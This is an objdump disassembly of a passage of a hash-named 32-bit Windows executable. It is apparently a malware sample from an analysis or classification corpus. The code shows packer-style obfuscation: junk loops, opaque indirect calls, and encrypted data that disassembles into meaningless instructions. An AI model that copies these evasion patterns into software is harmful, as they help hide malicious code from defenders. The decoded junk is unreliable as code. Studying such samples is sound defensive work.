
ddd6e75f63a475c114d6a69b41a81e7778261709c02bdb69ed40649f13ba66b9.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0x98
  401009:	mov    DWORD PTR ds:0x433797,0x1c
  401013:	cmp    DWORD PTR ds:0x433797,0x0
  40101a:	je     0x40106d
  401020:	cmp    DWORD PTR ds:0x433797,0x6
  401027:	jne    0x401040
  40102d:	push   0x8196
  401032:	push   DWORD PTR [ebp-0xc]
  401035:	push   0x6434
  40103a:	call   DWORD PTR ds:0x412268
  401040:	cmp    DWORD PTR ds:0x433797,0x7
  401047:	jne    0x40105b
  40104d:	xor    eax,eax
  40104f:	xor    eax,DWORD PTR ds:0x433797
  401055:	dec    eax
  401056:	mov    ds:0x433797,eax
  40105b:	mov    eax,ds:0x433797
  401060:	dec    eax
  401061:	mov    ds:0x433797,eax
  401066:	jmp    0x401013
  40106b:	or     ecx,eax
  40106d:	mov    eax,ds:0x413b34
  401072:	mov    DWORD PTR [ebp-0x18],eax
  401075:	sub    DWORD PTR ds:0x43379b,0x1705
  40107f:	mov    eax,ds:0x413c44
  401084:	sub    DWORD PTR ds:0x43379f,edx
  40108a:	mov    DWORD PTR [ebp-0x48],eax
  40108d:	xor    eax,ecx
  40108f:	mov    DWORD PTR [ebp-0x10],0xf89c8531
  401096:	add    eax,DWORD PTR ds:0x4337d3
  40109c:	mov    DWORD PTR [ebp-0x1c],0xf89c8532
  4010a3:	sbb    eax,eax
  4010a5:	mov    eax,DWORD PTR [ebp-0x10]
  4010a8:	push   ebx
  4010a9:	movzx  ebx,BYTE PTR ds:0x4337af
  4010b0:	sbb    ebx,DWORD PTR ds:0x433793
  4010b6:	mov    DWORD PTR ds:0x4337af,ebx
  4010bc:	push   esi
  4010bd:	mov    esi,0x7510854
  4010c2:	xor    eax,esi
  4010c4:	push   edi
  4010c5:	or     ecx,ebx
  4010c7:	mov    edi,0x32729b
  4010cc:	add    eax,edi
  4010ce:	and    DWORD PTR ds:0x43382b,0x264c
  4010d8:	mov    DWORD PTR [ebp-0x38],eax
  4010db:	mov    DWORD PTR ds:0x4337af,0x18
  4010e5:	cmp    DWORD PTR ds:0x4337af,0x0
  4010ec:	je     0x401146
  4010f2:	cmp    DWORD PTR ds:0x4337af,0xc
  4010f9:	jne    0x401108
  4010ff:	push   DWORD PTR [ebp-0x24]
  401102:	call   DWORD PTR ds:0x4120b4
  401108:	cmp    DWORD PTR ds:0x4337af,0xd
  40110f:	jne    0x401122
  401115:	mov    ebx,DWORD PTR ds:0x4337af
  40111b:	dec    ebx
  40111c:	mov    DWORD PTR ds:0x4337af,ebx
  401122:	xor    ebx,ebx
  401124:	add    ebx,DWORD PTR ds:0x4337af
  40112a:	dec    ebx
  40112b:	mov    DWORD PTR ds:0x4337af,ebx
  401131:	jmp    0x4010e5
  401136:	mov    ecx,DWORD PTR ds:0x433777
  40113c:	mov    eax,ds:0x433833
  401141:	sub    ecx,eax
  401143:	add    ecx,DWORD PTR [ecx+eax*1]
  401146:	mov    DWORD PTR [ebp-0x44],0xf89cb531
  40114d:	mov    DWORD PTR [ebp-0x54],0xf89f0531
  401154:	mov    DWORD PTR [ebp-0x4c],0xf89c85f1
  40115b:	or     DWORD PTR ds:0x43381b,0x1296
  401165:	mov    DWORD PTR [ebp-0x3c],0xf89c85d1
  40116c:	mov    eax,DWORD PTR [ebp-0x10]
  40116f:	sub    DWORD PTR ds:0x4336ff,0x1011
  401179:	xor    eax,esi
  40117b:	add    eax,edi
  40117d:	mov    DWORD PTR [ebp-0xc],eax
  401180:	sbb    DWORD PTR ds:0x43371f,0x6b1e
  40118a:	mov    DWORD PTR [ebp-0x28],0xf89c853e
  401191:	mov    BYTE PTR [ebp-0x11],0x67
  401195:	mov    eax,DWORD PTR [ebp-0x10]
  401198:	xor    DWORD PTR ds:0x43375b,0x46ad
  4011a2:	xor    eax,esi
  4011a4:	add    eax,edi
  4011a6:	jmp    0x401347
  4011ab:	jb     0x401145
  4011ad:	fsub   DWORD PTR [edx]
  4011af:	lock bound esi,QWORD PTR [eax+0x68]
  4011b3:	push   ecx
  4011b4:	in     al,0x70
  4011b6:	or     BYTE PTR [edi+0x7ef5ccc8],ah
  4011bc:	jle    0x40123c
  4011be:	jle    0x4011ba
  4011c0:	jg     0x401240
  4011c2:	jle    0x401192
  4011c4:	xlat   BYTE PTR ds:[ebx]
  4011c5:	cmp    eax,0xcfd339d5
  4011ca:	rol    edx,1
  4011cc:	pop    es
  4011cd:	add    al,0x3
  4011cf:	add    BYTE PTR [ebx+0x0],ah
  4011d2:	rdpmc  
  4011d4:	xadd   BYTE PTR [eax],bl
  4011d7:	(bad)  
  4011d8:	adc    BYTE PTR [edi],bl
  4011da:	mov    ecx,0xddb70058
  4011df:	push   cs
  4011e0:	out    dx,eax
  4011e1:	mov    ebp,0x8e03d6db
  4011e6:	es mov esi,0x1541a2f4
  4011ec:	lods   eax,DWORD PTR ds:[esi]
  4011ed:	fiadd  WORD PTR [esi+0x1f]
  4011f0:	data16 in al,dx
  4011f2:	outs   dx,DWORD PTR ds:[esi]
  4011f3:	or     edx,DWORD PTR [ecx]
  4011f5:	pushf  
  4011f6:	js     0x4011ce
  4011f8:	inc    eax
  4011f9:	stos   BYTE PTR es:[edi],al
  4011fa:	push   ebx
  4011fb:	sub    eax,0xad3cc4d1
  401200:	mov    bh,BYTE PTR [ebx-0x3b]
  401203:	stos   DWORD PTR es:[edi],eax
  401204:	push   es
  401205:	(bad)  
  401206:	rol    DWORD PTR [ecx+0x3990d6f9],cl
  40120c:	jmp    0x40123e
  40120e:	mov    ebp,ecx
  401210:	dec    edi
  401211:	out    0xa6,al
  401213:	inc    ecx
  401214:	call   DWORD PTR [edi-0x2556f868]
  40121a:	mov    ebp,0x5536ed4d
  40121f:	and    esi,DWORD PTR [edx-0x43619116]
  401225:	jnp    0x401238
  401227:	ret    
  401228:	xchg   edx,eax
  401229:	and    esp,edx
  40122b:	jmp    0x40128b
  40122d:	ret    0xb8e4
  401230:	lock jmp 0xd765:0x74cf3192
  401238:	and    ch,cl
  40123a:	add    bl,cl
  40123c:	adc    DWORD PTR [ecx-0x5a],edx
  40123f:	xor    eax,0x78616f03
  401244:	or     BYTE PTR [ecx],dh
  401246:	fisttp QWORD PTR [esi+0x7f752854]
  40124c:	(bad)
  401251:	or     ebx,DWORD PTR [ebx+0x55]
  401254:	fst    st(6)
  401256:	or     ebx,edx
  401258:	pop    esp
  401259:	fstp   DWORD PTR [ecx]
  40125b:	jno    0x4011fb
  40125d:	inc    esi
  40125e:	dec    ebx
  40125f:	aaa    
  401260:	adc    eax,0x1a29772b
  401265:	sar    DWORD PTR [esi],cl
  401267:	dec    edi
  401268:	call   0x5d56b739
  40126d:	inc    al
  40126f:	add    al,0x4b
  401271:	push   0xddb639a2
  401276:	mov    ebp,0x4ae52f85
  40127b:	add    cl,al
  40127d:	xchg   edx,eax
  40127e:	jmp    0x266a112e
  401283:	mov    bh,BYTE PTR [ebx+0xc]
  401286:	pop    es
  401287:	xchg   edi,eax
  401288:	imul   edi,DWORD PTR [ecx+0x36],0x5f
  40128c:	push   0x754b5a62
  401291:	dec    ebp
  401292:	ret    0x924b
  401295:	sub    al,0x3c
  401297:	imul   ecx,edx,0xffffffde
  40129a:	test   BYTE PTR [ebp+0x75],dh
  40129d:	cmp    ch,BYTE PTR ds:0x6d5f0fab
  4012a3:	repnz cwde 
  4012a5:	mov    bh,0xb3
  4012a7:	and    cl,BYTE PTR ds:0x6c7e6843
  4012ad:	mov    dh,0x75
  4012af:	inc    esp
  4012b0:	and    al,0x73
  4012b2:	add    eax,esp
  4012b4:	pop    esp
  4012b5:	fwait
  4012b6:	aaa    
  4012b7:	js     0x401310
  4012b9:	mov    eax,ds:0x69dc02e3
  4012be:	cmp    BYTE PTR ds:[ebp+ebp*1+0x50],dl
  4012c3:	call   0x1f65:0x27dcf75b
  4012ca:	mov    ah,0xfa
  4012cc:	imul   ecx,DWORD PTR [edi],0x84dd3b2d
  4012d2:	pop    ss
  4012d3:	out    dx,eax
  4012d4:	pusha  
  4012d5:	push   edx
  4012d6:	push   ebp
  4012d7:	jne    0x4012a4
  4012d9:	stos   DWORD PTR es:[edi],eax
  4012da:	test   DWORD PTR [esi+0x71],0x61bc897b
  4012e1:	jle    0x401275
  4012e3:	and    DWORD PTR [ebp+0x335ece7],ebp
  4012e9:	repz and cl,bh
  4012ec:	lods   eax,DWORD PTR ds:[esi]
  4012ed:	pop    ebx
  4012ee:	xor    DWORD PTR [eax+edx*8+0x55],ebp
  4012f2:	(bad)  
  4012f3:	(bad)  
  4012f4:	mov    esp,0xaf849f75
  4012f9:	outs   dx,BYTE PTR ds:[esi]
  4012fa:	repz push edi
  4012fc:	mov    esp,0x59de2b70
  401301:	mov    fs,WORD PTR [ecx+0x5b]
  401304:	pusha  
  401305:	das    
  401306:	xor    esp,edx
  401308:	scas   eax,DWORD PTR es:[edi]
  401309:	clc    
  40130a:	cli    
  40130b:	ja     0x401366
  40130d:	push   ecx
  40130e:	jns    0x40136d
  401310:	adc    eax,0x7b28aea2
  401315:	push   0x6d5bb4ab
  40131a:	ficom  WORD PTR [esp+edi*4+0x67]
  40131e:	mov    ds:0x69ce40ed,al
  401323:	loope  0x4012fb
  401325:	aaa    
  401326:	lods   al,BYTE PTR ds:[esi]
  401327:	and    DWORD PTR ds:[ecx+0x76ad328e],esi
  40132e:	bound  ebp,QWORD PTR [edx]
  401330:	dec    eax
  401331:	out    dx,al
  401332:	inc    eax
  401333:	shl    BYTE PTR [edi-0x68],1
  401336:	cld    
  401337:	cmp    eax,0xbc4da11a
  40133c:	test   DWORD PTR [esp+esi*1],eax
  40133f:	xor    DWORD PTR [ebp+0x1ae88f78],edi
  401345:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401346:	mov    DWORD PTR cs:[ebp-0xc],eax
  40134a:	and    DWORD PTR ds:0x433753,0x0
  401354:	jmp    0x401366
  401359:	mov    ebx,DWORD PTR ds:0x433753
  40135f:	inc    ebx
  401360:	mov    DWORD PTR ds:0x433753,ebx
  401366:	cmp    DWORD PTR ds:0x433753,0x10
  40136d:	jae    0x401543
  401373:	cmp    DWORD PTR ds:0x433753,0x12
  40137a:	jne    0x401393
  401380:	push   0x3bad
  401385:	push   0x706b
  40138a:	push   DWORD PTR [ebp-0x20]
  40138d:	call   DWORD PTR ds:0x412284
  401393:	jmp    0x401359
  401398:	or     DWORD PTR ds:0x43370b,0x4336ff
  4013a2:	jmp    0x401543
  4013a7:	dec    ebp
  4013a8:	push   0xb1638b43
  4013ad:	push   ebp
  4013ae:	push   0xd91cd24
  4013b3:	jmp    0xfaf837f2
  4013b8:	jg     0x401438
  4013ba:	jle    0x4013b6
  4013bc:	jg     0x40143c
  4013be:	jle    0x401422
  4013c0:	mov    edx,0x22b6357d
  4013c5:	scas   al,BYTE PTR es:[edi]
  4013c6:	fucom  st(0)
  4013c8:	shl    DWORD PTR [esi],1
  4013ca:	jl     0x4013a8
  4013cc:	jmp    0x31f8:0x514fe889
  4013d3:	(bad)  
  4013d5:	pop    ebp
  4013d6:	inc    esp
  4013d7:	jmp    0xe0fcfb62
  4013dc:	addr16 pop esi
  4013de:	push   ebp
  4013df:	call   0x7194:0x88b773b0
  4013e6:	sub    ch,BYTE PTR [ebx-0x5203994a]
  4013ec:	(bad)
  4013ef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4013f0:	pop    ds
  4013f1:	test   DWORD PTR [ebp-0x699bdc0e],ecx
  4013f7:	daa    
  4013f8:	pop    ss
  4013f9:	pop    edx
  4013fa:	mov    al,0xcd
  4013fc:	jnp    0x401446
  4013fe:	jl     0x401458
  401400:	neg    BYTE PTR [esi-0x712563d2]
  401406:	or     bh,ch
  401408:	dec    ebp
  401409:	jmp    0x401407
  40140b:	mov    esp,0x3513c86f
  401410:	iret   
  401411:	(bad)  
  401412:	mov    ds:0x30f699a5,al
  401417:	jbe    0x4013aa
  401419:	ss mov esp,0xbb5879a9
  40141f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401420:	(bad)  
  401421:	sub    al,0x7a
  401423:	pop    ss
  401424:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401425:	shl    DWORD PTR [edi+0x6],1
  401428:	in     al,dx
  401429:	ins    BYTE PTR es:[edi],dx
  40142a:	add    eax,DWORD PTR [eax-0x2ae89c51]
  401430:	or     DWORD PTR [eax],ebp
  401432:	cmp    BYTE PTR [ebp+0x5d14ec8],dh
  401438:	pushf  
  401439:	and    al,0x73
  40143b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40143c:	sbb    esi,DWORD PTR [ecx+0x2da9f856]
  401442:	cld    
  401443:	cld    
  401444:	lds    ecx,FWORD PTR [edi-0x78130b94]
  40144a:	sti    
  40144b:	pop    esi
  40144c:	jge    0x4014aa
  40144e:	mov    ebx,0x77ad2b81
  401453:	and    ebp,edi
  401455:	jecxz  0x4014c4
  401457:	inc    esi
  401458:	mov    WORD PTR [eax-0x22dcf81a],ss
  40145e:	icebp  
  40145f:	cdq    
  401460:	jmp    0x401406
  401462:	adc    cl,al
  401464:	xor    edx,DWORD PTR [ecx+0x2839d410]
  40146a:	or     eax,0x1a5cdc59
  40146f:	xor    BYTE PTR [edi-0x54a45c42],cl
  401475:	enter  0x2a,0x57
  401479:	mov    dl,0xe9
  40147b:	rcl    DWORD PTR [ecx],1
  40147d:	xchg   ebp,eax
  40147e:	icebp  
  40147f:	or     al,0x1
  401481:	int3   
  401482:	add    al,ch
  401484:	pop    eax
  401485:	mov    esp,0x260ed2dd
  40148a:	lods   al,BYTE PTR ds:[esi]
  40148b:	cmp    BYTE PTR [esi],0xc8
  40148e:	in     eax,0xe8
  401490:	ds jmp 0xc626974a
  401496:	dec    edi
  401497:	mov    ds,WORD PTR [edx+0x6e]
  40149a:	dec    ecx
  40149b:	push   esi
  40149c:	jp     0x40142b
  40149e:	pop    eax
  40149f:	(bad)  
  4014a0:	mov    esi,0xcafd88f4
  4014a5:	popa   
  4014a6:	xchg   ebp,eax
  4014a7:	out    0x2a,al
  4014a9:	mov    ecx,0x5dbcd64
  4014ae:	sub    eax,DWORD PTR [eax-0x4b]
  4014b1:	ins    BYTE PTR es:[edi],dx
  4014b2:	inc    ebp
  4014b3:	(bad)  
  4014b4:	or     DWORD PTR [edx-0x9070072],0xffffff95
  4014bb:	add    cl,BYTE PTR ds:0xcc4d18f3
  4014c1:	inc    ebp
  4014c2:	lock rcl ebx,cl
  4014c5:	jmp    0x401476
  4014c7:	jae    0x40149c
  4014c9:	neg    BYTE PTR [edx-0x1a]
  4014cc:	jb     0x401463
  4014ce:	inc    esi
  4014cf:	sar    BYTE PTR [esi-0x3],cl
  4014d2:	nop
  4014d3:	popf   
  4014d4:	and    DWORD PTR [edi-0x1237b0ea],edx
  4014da:	push   DWORD PTR [ebp-0x8]
  4014dd:	out    0xa6,al
  4014df:	lea    ebx,[esi+0x50f1046d]
  4014e5:	popa   
  4014e6:	push   ds
  4014e7:	repnz lods al,BYTE PTR ds:[esi]
  4014e9:	jmp    0x14ab29fd
  4014ee:	(bad)  
  4014ef:	repz mov bl,0xc6
  4014f2:	sbb    eax,DWORD PTR [ebx-0x80]
  4014f5:	fdivrp st(5),st
  4014f7:	lds    esp,FWORD PTR [edx-0x41]
  4014fa:	scas   eax,DWORD PTR es:[edi]
  4014fb:	lahf   
  4014fc:	jae    0x401510
  4014fe:	repnz scas eax,DWORD PTR es:[edi]
  401500:	inc    esp
  401501:	pop    eax
  401502:	jns    0x4014c4
  401504:	stc    
  401505:	std    
  401506:	ja     0x40155b
  401508:	inc    ebp
  401509:	adc    BYTE PTR [esi+0x32],cl
  40150c:	xchg   ebx,eax
  40150d:	out    dx,eax
  40150e:	hlt    
  40150f:	mov    cl,0x71
  401511:	mov    cs,WORD PTR [edx*2-0x4ad3b768]
  401518:	fcmovnbe st,st(2)
  40151a:	mov    ah,0x8a
  40151c:	sub    esi,edx
  40151e:	jnp    0x401537
  401520:	lahf   
  401521:	(bad)  
  401522:	std    
  401523:	jmp    0x49e9:0xbdff25c2
  40152a:	les    ebp,FWORD PTR [edx-0x6398a6eb]
  401530:	(bad)  
  401531:	fimul  WORD PTR [ebx-0x5000ad82]
  401537:	dec    edx
  401538:	clc    
  401539:	out    dx,al
  40153a:	(bad)  
  40153b:	fistp  DWORD PTR [ebx]
  40153d:	jmp    0x8b8d:0x6edd94f0
  401544:	inc    ebp
  401545:	les    esi,FWORD PTR [ecx]
  401547:	sbb    eax,0x43370f
  40154c:	xor    eax,esi
  40154e:	neg    ecx
  401550:	jmp    0x4016f1
  401555:	cli    
  401556:	fcomp  QWORD PTR [edx-0x4caea7e9]
  40155c:	jno    0x4014f6
  40155e:	cmp    ah,BYTE PTR [ebx-0x74bfb21d]
  401564:	addr16 push es
  401566:	jge    0x4015e6
  401568:	jle    0x401564
  40156a:	jg     0x4015ea
  40156c:	jle    0x4014fa
  40156e:	jmp    DWORD PTR [ebx]
  401570:	call   0x91da:0x69fc1962
  401577:	inc    edx
  401578:	push   es
  401579:	and    ebp,DWORD PTR [ebp-0x2749897c]
  40157f:	xor    ch,ah
  401581:	mov    bh,0x9e
  401583:	sti    
  401584:	popa   
  401585:	int    0x3c
  401587:	out    dx,eax
  401588:	pop    ebx
  401589:	adc    BYTE PTR [ebp+0x19],0x41
  40158d:	icebp  
  40158e:	psubw  mm6,mm0
  401591:	mov    ebx,0x2771ba0b
  401596:	add    BYTE PTR [eax],0x86
  401599:	jmp    0x401567
  40159b:	dec    edi
  40159c:	(bad)  
  40159e:	hlt    
  40159f:	jb     0x401527
  4015a1:	scas   eax,DWORD PTR es:[edi]
  4015a2:	or     al,0xf5
  4015a4:	add    esp,ebp
  4015a6:	and    BYTE PTR [ebp+0x26],al
  4015a9:	xchg   edx,eax
  4015aa:	rol    BYTE PTR [ecx-0x61],1
  4015ad:	pop    ecx
  4015ae:	xchg   esp,eax
  4015af:	int    0x6f
  4015b1:	push   cs
  4015b2:	ret    
  4015b3:	test   bl,bh
  4015b5:	adc    BYTE PTR [esi-0x2d038adb],0xd7
  4015bc:	mov    eax,ds:0x65e91ecc
  4015c1:	in     al,dx
  4015c2:	fnstenv [edi-0x4fb573c5]
  4015c8:	loope  0x40157d
  4015ca:	jecxz  0x40157c
  4015cc:	cmp    BYTE PTR [ecx],cl
  4015ce:	in     al,dx
  4015cf:	pushf  
  4015d0:	or     dh,al
  4015d2:	or     ebp,DWORD PTR [ecx]
  4015d4:	mov    eax,0xf209c07e
  4015d9:	adc    al,bh
  4015db:	sbb    bh,al
  4015dd:	neg    BYTE PTR [edx+0x62]
  4015e0:	cmc    
  4015e1:	leave  
  4015e2:	lods   al,BYTE PTR ds:[esi]
  4015e3:	mov    dh,0xca
  4015e5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4015e6:	(bad)  
  4015e7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4015e8:	pop    eax
  4015e9:	sub    edx,ecx
  4015eb:	les    esi,FWORD PTR [ecx+0x1b]
  4015ee:	add    eax,0xf1f45bcc
  4015f3:	pusha  
  4015f4:	mov    ebx,0x7206d46c
  4015f9:	popa   
  4015fa:	or     esp,ecx
  4015fc:	inc    ebx
  4015fd:	arpl   WORD PTR [eax-0x64],sp
  401600:	dec    ebx
  401601:	lods   eax,DWORD PTR ds:[esi]
  401602:	cmp    esi,ebx
  401604:	int3   
  401605:	fdiv   DWORD PTR [edi-0x23]
  401608:	sbb    ecx,ebp
  40160a:	cmp    BYTE PTR [ebp+0x6aa775a],bl
  401610:	mov    dl,BYTE PTR [eax+eax*1]
  401613:	mov    WORD PTR [ecx+0xf45c2c7],ss
  401619:	dec    edi
  40161a:	daa    
  40161b:	adc    BYTE PTR [ebx-0x708fdea9],dl
  401621:	sub    al,0xd7
  401623:	gs (bad) 
  401625:	je     0x4015ba
  401627:	mov    dl,0xcb
  401629:	mov    dh,0xeb
  40162b:	push   esp
  40162c:	add    dl,BYTE PTR [edi-0x4e9a3e38]
  401632:	call   0xd1d5759c
  401637:	mov    ch,0x1
  401639:	mov    ecx,0x7f86da3f
  40163e:	clc    
  40163f:	repz lea eax,[ebp+0x4f]
  401643:	clc    
  401644:	inc    edx
  401645:	pop    edx
  401646:	mov    dh,0x0
  401648:	xor    bh,bh
  40164a:	sbb    dh,bh
  40164c:	sbb    BYTE PTR [edi],bh
  40164e:	push   ds
  40164f:	cmc    
  401650:	xor    al,BYTE PTR [ecx-0x5f2998c2]
  401656:	xor    DWORD PTR [edx+0x2e],edx
  401659:	pop    eax
  40165a:	jl     0x4015f9
  40165c:	outs   dx,DWORD PTR ds:[esi]
  40165d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40165e:	or     eax,DWORD PTR [ecx]
  401660:	scas   al,BYTE PTR es:[edi]
  401661:	outs   dx,BYTE PTR ds:[esi]
  401662:	retf   0xc332
  401665:	or     eax,0x5ab56eee
  40166a:	add    eax,0xf7d86c18
  40166f:	inc    ecx
  401670:	inc    BYTE PTR [ecx+0x5]
  401673:	aam    0x7b
  401675:	mov    edx,0xc844fde0
  40167a:	adc    cl,BYTE PTR [edi+0x3bcd904d]
  401680:	pusha  
  401681:	xchg   ebp,eax
  401682:	xchg   esi,eax
  401683:	dec    esi
  401684:	push   ebx
  401685:	xchg   ah,dl
  401687:	lock cmp bh,0x79
  40168b:	sbb    DWORD PTR [ecx-0x74c0ba53],ebx
  401691:	mov    al,0xe6
  401693:	lahf   
  401694:	mov    ds:0xa83afcd2,eax
  401699:	dec    edi
  40169a:	or     DWORD PTR [ebp+0x9],edx
  40169d:	add    edi,edx
  40169f:	adc    DWORD PTR [ebx-0x15],edx
  4016a2:	adc    DWORD PTR [ecx+0x24e485b7],ecx
  4016a8:	daa    
  4016a9:	inc    esi
  4016aa:	xor    eax,0xef0297ff
  4016af:	push   esi
  4016b0:	nop
  4016b1:	ins    DWORD PTR es:[edi],dx
  4016b2:	and    esi,DWORD PTR [esi+0x4]
  4016b5:	test   eax,0x91de55e1
  4016ba:	add    dh,BYTE PTR [edi+esi*1]
  4016bd:	xor    dl,ch
  4016bf:	push   bp
  4016c1:	shr    DWORD PTR [eax+esi*2+0x5a],0x8d
  4016c6:	mov    ds:0xf2ef17ba,al
  4016cb:	into   
  4016cc:	inc    edx
  4016cd:	inc    ebx
  4016ce:	push   ds
  4016cf:	and    DWORD PTR ds:0x55539763,ebx
  4016d5:	aaa    
  4016d6:	mov    al,ds:0xb288d8f
  4016db:	dec    esi
  4016dc:	(bad)  
  4016dd:	adc    eax,0x810a069d
  4016e2:	(bad)  
  4016e3:	iret   
  4016e4:	bswap  esp
  4016e6:	adc    DWORD PTR [ecx],ebp
  4016e8:	push   esp
  4016e9:	inc    esi
  4016ea:	pop    ss
  4016eb:	sub    BYTE PTR [esi+ebp*8+0x3034732],0xc7
  4016f3:	mov    DWORD PTR [ebp-0x34],eax
  4016f6:	mov    eax,DWORD PTR [ebp-0x44]
  4016f9:	xor    eax,esi
  4016fb:	sbb    ecx,ecx
  4016fd:	add    eax,edi
  4016ff:	mov    DWORD PTR [ebp-0x30],eax
  401702:	mov    eax,DWORD PTR [ebp-0x28]
  401705:	and    DWORD PTR ds:0x4337df,0x0
  40170f:	jmp    0x401721
  401714:	mov    ebx,DWORD PTR ds:0x4337df
  40171a:	inc    ebx
  40171b:	mov    DWORD PTR ds:0x4337df,ebx
  401721:	cmp    DWORD PTR ds:0x4337df,0x18
  401728:	jae    0x40176c
  40172e:	cmp    DWORD PTR ds:0x4337df,0xa
  401735:	jne    0x40174b
  40173b:	push   0x7b82
  401740:	push   0x1a57
  401745:	call   DWORD PTR ds:0x41226c
  40174b:	cmp    DWORD PTR ds:0x4337df,0x9
  401752:	jne    0x401767
  401758:	xor    ebx,ebx
  40175a:	xor    ebx,DWORD PTR ds:0x4337df
  401760:	inc    ebx
  401761:	mov    DWORD PTR ds:0x4337df,ebx
  401767:	jmp    0x401714
  40176c:	xor    eax,esi
  40176e:	sbb    DWORD PTR ds:0x433703,0x47a9
  401778:	add    eax,edi
  40177a:	dec    DWORD PTR ds:0x433717
  401780:	mov    DWORD PTR [ebp-0x2c],eax
  401783:	lea    eax,[ebp-0x98]
  401789:	mov    DWORD PTR [ebp-0x8],eax
  40178c:	movzx  ecx,WORD PTR ds:0x43370b
  401793:	and    ecx,DWORD PTR ds:0x43375b
  401799:	mov    DWORD PTR ds:0x43370b,ecx
  40179f:	mov    eax,DWORD PTR [ebp-0x10]
  4017a2:	mov    DWORD PTR [ebp-0x24],eax
  4017a5:	and    DWORD PTR ds:0x43382f,0x0
  4017af:	jmp    0x4017c3
  4017b4:	xor    ebx,ebx
  4017b6:	or     ebx,DWORD PTR ds:0x43382f
  4017bc:	inc    ebx
  4017bd:	mov    DWORD PTR ds:0x43382f,ebx
  4017c3:	cmp    DWORD PTR ds:0x43382f,0x1c
  4017ca:	jae    0x40184e
  4017d0:	cmp    DWORD PTR ds:0x43382f,0x11
  4017d7:	jne    0x4017f0
  4017dd:	push   DWORD PTR [ebp-0x14]
  4017e0:	push   0x35e4
  4017e5:	push   0x7b35
  4017ea:	call   DWORD PTR ds:0x412270
  4017f0:	cmp    DWORD PTR ds:0x43382f,0x10
  4017f7:	jne    0x40180a
  4017fd:	mov    ebx,DWORD PTR ds:0x43382f
  401803:	inc    ebx
  401804:	mov    DWORD PTR ds:0x43382f,ebx
  40180a:	jmp    0x4017b4
  40180f:	and    DWORD PTR ds:0x4337e3,0x0
  401819:	mov    eax,ds:0x4337e3
  40181e:	inc    eax
  40181f:	mov    ds:0x4337e3,eax
  401824:	cmp    DWORD PTR ds:0x4337e3,0x27
  40182b:	jne    0x401841
  401831:	push   0x1cc5
  401836:	push   0x433723
  40183b:	call   DWORD PTR ds:0x412338
  401841:	cmp    DWORD PTR ds:0x4337e3,0x1d
  401848:	jb     0x401819
  40184e:	mov    eax,DWORD PTR [ebp-0x1c]
  401851:	xor    ebx,DWORD PTR ds:0x43381f
  401857:	mov    DWORD PTR [ebp-0x20],eax
  40185a:	and    DWORD PTR ds:0x43382b,0x0
  401864:	jmp    0x401878
  401869:	xor    ecx,ecx
  40186b:	xor    ecx,DWORD PTR ds:0x43382b
  401871:	inc    ecx
  401872:	mov    DWORD PTR ds:0x43382b,ecx
  401878:	cmp    DWORD PTR ds:0x43382b,0x12
  40187f:	jae    0x4018d1
  401885:	cmp    DWORD PTR ds:0x43382b,0x4
  40188c:	jne    0x4018b2
  401892:	push   0x6e91
  401897:	push   DWORD PTR [ebp-0x10]
  40189a:	push   DWORD PTR [ebp-0x24]
  40189d:	push   0x5930
  4018a2:	push   0x63f1
  4018a7:	push   0x153a
  4018ac:	call   DWORD PTR ds:0x412274
  4018b2:	cmp    DWORD PTR ds:0x43382b,0x3
  4018b9:	jne    0x4018cc
  4018bf:	mov    ecx,DWORD PTR ds:0x43382b
  4018c5:	inc    ecx
  4018c6:	mov    DWORD PTR ds:0x43382b,ecx
  4018cc:	jmp    0x401869
  4018d1:	mov    ebx,0xf89c853d
  4018d6:	jmp    0x401a77
  4018db:	or     ecx,esi
  4018dd:	out    0x8,al
  4018df:	jecxz  0x401911
  4018e1:	icebp  
  4018e2:	int    0x17
  4018e4:	add    eax,0x36856ade
  4018e9:	mov    ebx,esi
  4018eb:	cmp    BYTE PTR [edx+0x7e],0x7e
  4018ef:	cli    
  4018f0:	jg     0x401970
  4018f2:	jle    0x40188d
  4018f4:	(bad)  
  4018f5:	outs   dx,BYTE PTR ds:[esi]
  4018f6:	xchg   esi,eax
  4018f7:	push   esi
  4018f8:	fwait
  4018f9:	xor    bh,BYTE PTR [edi]
  4018fb:	data16 lahf 
  4018fd:	jmp    0x5e09271e
  401902:	sub    BYTE PTR [esp+eax*1+0x85f0e11],cl
  401909:	rol    ecx,cl
  40190b:	mov    al,0x23
  40190d:	cmp    eax,0xb5ddc4cc
  401912:	mov    esp,0xdc604278
  401917:	jo     0x401991
  401919:	jecxz  0x40195d
  40191b:	test   eax,0x61117c4c
  401920:	call   0xc923:0xfb7e4e3e
  401927:	mov    esi,ebx
  401929:	inc    ebx
  40192a:	(bad)  
  40192b:	out    dx,eax
  40192c:	jbe    0x40190b
  40192e:	xchg   BYTE PTR ds:0x7f0ea8dd,cl
  401934:	repz push eax
  401936:	mov    dl,0x76
  401938:	lea    eax,[esi+0x6a]
  40193b:	or     eax,0x16fae87e
  401940:	jo     0x40198e
  401942:	adc    bl,BYTE PTR [esi-0x183560e9]
  401948:	jg     0x40197e
  40194a:	cwde   
  40194b:	dec    esi
  40194c:	jmp    0x1cf8531b
  401951:	clc    
  401952:	jo     0x40195e
  401954:	mov    ecx,0x6f7e1d8c
  401959:	daa    
  40195a:	stos   BYTE PTR es:[edi],al
  40195b:	inc    esi
  40195c:	pop    esi
  40195d:	dec    ebx
  40195e:	and    dh,BYTE PTR [edx]
  401960:	inc    edx
  401961:	enter  0x18e9,0x62
  401965:	aas    
  401966:	add    al,0xaa
  401968:	pop    ecx
  401969:	cmp    DWORD PTR [edx],ebx
  40196b:	xor    dl,dh
  40196d:	mov    eax,ds:0xf7cab020
  401972:	int3   
  401973:	and    BYTE PTR [ebp+esi*1+0x1c],0x17
  401978:	ret    0x91a1
  40197b:	test   eax,0xf0ed66fe
  401980:	xor    al,0x13
  401982:	(bad)  
  401984:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401985:	rcl    BYTE PTR [edx-0x60c55e1],cl
  40198b:	and    DWORD PTR [edi-0x10],edx
